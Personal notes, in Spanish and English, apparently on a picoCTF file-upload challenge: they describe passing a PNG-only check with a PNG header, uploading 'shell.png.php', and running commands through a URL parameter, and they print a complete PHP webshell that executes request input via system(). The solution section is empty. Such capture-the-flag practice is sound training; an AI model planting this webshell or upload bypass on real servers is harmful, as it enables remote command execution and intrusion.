Description I found a web app that can help process images: PNG images only! Additional details will be available after launching your challenge instance.

Descripción Encontré una aplicación web que puede ayudar a procesar imágenes: ¡solo imágenes PNG! Habrá detalles adicionales disponibles después de lanzar su instancia de desafío.

![[Pasted image 20250402124516.png]]
con que tenga PNG al inicio 
![[Pasted image 20250402124624.png]]
![[Pasted image 20250402124639.png]]
http://atlas.picoctf.net:49881/uploads/shell.png.php?
cdm=ls ..

cat ../nombrearchivo.txt
Webshell sencillo
```
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = $_REQUEST['cmd'];
    system($cmd);
    echo "</pre>";
}
?>

<form method="get">
    <input type="text" name="cmd" />
    <input type="submit" value="Ejecutar Comando" />
</form>

```
## Solución
```
```